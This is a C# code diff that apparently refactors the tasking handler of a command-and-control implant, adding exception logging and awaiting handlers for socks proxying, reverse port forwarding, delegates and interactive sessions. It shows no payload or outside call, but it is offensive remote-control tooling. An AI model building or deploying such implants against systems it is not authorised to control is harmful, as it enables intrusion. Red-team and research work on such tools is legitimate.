@@ -71,9 +71,9 @@ namespace Workflow
                     DebugLog.Log($"Applying mod: {mod.GetType().Name}");
                     await mod.Go();
                 }
-                catch
+                catch (Exception e)
                 {
-
+                    DebugLog.Log($"Failed to apply mod {mod.GetType().Name}: {e.Message}");
                 }
             }
         }
@@ -162,45 +162,51 @@ namespace Workflow
 
         private async void OnTaskingReceived(object sender, TaskingReceivedArgs args)
         {
-            if(args.tasking_response is null)
+            try
             {
-                DebugLog.Log("OnTaskingReceived: null tasking response");
-                return;
-            }
-
-            DebugLog.Log($"OnTaskingReceived: tasks={args.tasking_response.tasks?.Count ?? 0}, socks={args.tasking_response.socks?.Count ?? 0}, rpfwd={args.tasking_response.rpfwd?.Count ?? 0}, delegates={args.tasking_response.delegates?.Count ?? 0}, responses={args.tasking_response.responses?.Count ?? 0}, interactive={args.tasking_response.interactive?.Count ?? 0}");
-
-            _ = this.taskManager.HandleProxyResponses("socks", args.tasking_response.socks);
-
-            if (args.tasking_response.rpfwd is not null)
-            {
-                _ =this.taskManager.HandleProxyResponses("rportfwd", args.tasking_response.rpfwd);
-            }
-
-            if (args.tasking_response.tasks is not null)
-            {
-                Parallel.ForEach(args.tasking_response.tasks, async task =>
+                if(args.tasking_response is null)
                 {
-                    _ = this.taskManager.StartTaskAsync(new ServerJob(task));
-                });
-            }
+                    DebugLog.Log("OnTaskingReceived: null tasking response");
+                    return;
+                }
 
-            if (args.tasking_response.delegates is not null)
-            {
-                _ = this.taskManager.HandleDelegateResponses(args.tasking_response.delegates);
-            }
+                DebugLog.Log($"OnTaskingReceived: tasks={args.tasking_response.tasks?.Count ?? 0}, socks={args.tasking_response.socks?.Count ?? 0}, rpfwd={args.tasking_response.rpfwd?.Count ?? 0}, delegates={args.tasking_response.delegates?.Count ?? 0}, responses={args.tasking_response.responses?.Count ?? 0}, interactive={args.tasking_response.interactive?.Count ?? 0}");
 
-            if(args.tasking_response.responses is not null)
-            {
-                _ = this.taskManager.HandleServerResponses(args.tasking_response.responses);
-            }
+                await this.taskManager.HandleProxyResponses("socks", args.tasking_response.socks);
 
-            if(args.tasking_response.interactive is not null)
+                if (args.tasking_response.rpfwd is not null)
+                {
+                    await this.taskManager.HandleProxyResponses("rportfwd", args.tasking_response.rpfwd);
+                }
+
+                if (args.tasking_response.tasks is not null)
+                {
+                    foreach (var task in args.tasking_response.tasks)
+                    {
+                        _ = this.taskManager.StartTaskAsync(new ServerJob(task));
+                    }
+                }
+
+                if (args.tasking_response.delegates is not null)
+                {
+                    await this.taskManager.HandleDelegateResponses(args.tasking_response.delegates);
+                }
+
+                if(args.tasking_response.responses is not null)
+                {
+                    await this.taskManager.HandleServerResponses(args.tasking_response.responses);
+                }
+
+                if(args.tasking_response.interactive is not null)
+                {
+                    await this.taskManager.HandleInteractiveResponses(args.tasking_response.interactive);
+                }
+            }
+            catch (Exception e)
             {
-                _ = this.taskManager.HandleInteractiveResponses(args.tasking_response.interactive);
+                DebugLog.Log($"OnTaskingReceived exception: {e.Message}");
             }
         }
-        //Is this correct?
         private bool CheckKillDate()
         {
             return this.config.killDate > DateTime.Now;
